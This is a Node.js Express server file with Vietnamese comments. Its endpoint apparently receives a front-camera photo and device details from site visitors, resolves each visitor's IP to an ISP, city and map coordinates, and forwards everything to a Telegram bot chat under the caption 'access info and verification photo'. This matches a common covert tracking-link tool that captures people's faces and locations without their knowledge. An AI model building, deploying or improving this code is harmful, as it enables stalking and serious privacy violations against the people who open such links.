// server.js - Express server: serve static + proxy Telegram
const express = require("express");
const multer = require("multer");
const path = require("path");

const app = express();
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB
});

app.use(express.json({ limit: "2mb" }));

// Serve static files (index.html, main.js, ...)
app.use(
  express.static(__dirname, {
    extensions: ["html"],
    setHeaders: (res, filePath) => {
      if (filePath.endsWith(".html")) {
        res.setHeader("Cache-Control", "no-cache");
      }
    },
  }),
);

// Health check (Render ping để biết service còn sống)
app.get("/healthz", (_, res) => res.status(200).send("ok"));

// ============ API PROXY TELEGRAM ============
app.post("/api/tele-proxy", upload.single("front"), async (req, res) => {
  const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!TOKEN || !CHAT_ID) {
    return res.status(500).json({
      error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
    });
  }

  try {
    // 1. Lấy IP người dùng (Render có x-forwarded-for)
    const userIP =
      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
      req.socket.remoteAddress ||
      "Unknown";

    // 2. Tra cứu vị trí địa lý (timeout 4s để không treo request)
    let geo = {};
    try {
      const geoRes = await fetch(`https://freeipapi.com/api/json/${userIP}`, {
        signal: AbortSignal.timeout(4000),
      });
      if (geoRes.ok) geo = await geoRes.json();
    } catch (_) {
      geo = {};
    }

    const lat = geo.latitude ?? "0";
    const lon = geo.longitude ?? "0";
    const address = `${geo.cityName || "Unknown"}, ${geo.regionName || "Unknown"}, ${geo.countryName || "Unknown"}`;

    // 3. Parse clientInfo
    let clientData = {};
    try {
      clientData = JSON.parse(req.body.clientInfo || "{}");
    } catch (_) {
      clientData = {};
    }

    // 4. Chỉ gửi khi có ảnh
    const file = req.file;
    if (!file || !file.buffer) {
      return res.status(200).json({
        success: false,
        message: "No photo captured, skipped sending.",
      });
    }

    // 5. Tạo caption
    const finalCaption = `
📡 [THÔNG TIN TRUY CẬP & ẢNH XÁC THỰC]

🕒 Thời gian: ${clientData.time || new Date().toLocaleString("vi-VN")}
📱 Thiết bị: ${clientData.device || "Unknown"}
🖥️ Hệ điều hành: ${clientData.os || "Unknown"}
🌍 IP: ${userIP}
🏢 ISP: ${geo.asName || "Unknown"}
🏙️ Địa chỉ: ${address}
🌎 Quốc gia: ${geo.countryName || "Unknown"}
📍 Vĩ độ: ${lat}
📍 Kinh độ: ${lon}
📌 Google Maps: https://www.google.com/maps?q=${lat},${lon}
📸 Camera: ${clientData.camera || "✅ Đã chụp"}

⚠️ Thông tin có thể chưa chính xác 100%.
`.trim();

    // 6. Gửi Telegram sendPhoto
    const teleForm = new FormData();
    teleForm.append("chat_id", CHAT_ID);
    teleForm.append("caption", finalCaption);
    teleForm.append(
      "photo",
      new Blob([file.buffer], { type: file.mimetype || "image/jpeg" }),
      "front.jpg",
    );

    const teleRes = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
      {
        method: "POST",
        body: teleForm,
        signal: AbortSignal.timeout(15000),
      },
    );

    const teleData = await teleRes.json().catch(() => ({}));

    return res.status(200).json({
      success: teleRes.ok && teleData.ok === true,
      telegram: teleData,
    });
  } catch (err) {
    console.error("[tele-proxy] error:", err);
    return res.status(500).json({ error: err.message });
  }
});

// Fallback SPA (nếu cần)
app.get("*", (req, res, next) => {
  if (req.path.startsWith("/api/")) return next();
  res.sendFile(path.join(__dirname, "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on port ${PORT}`);
});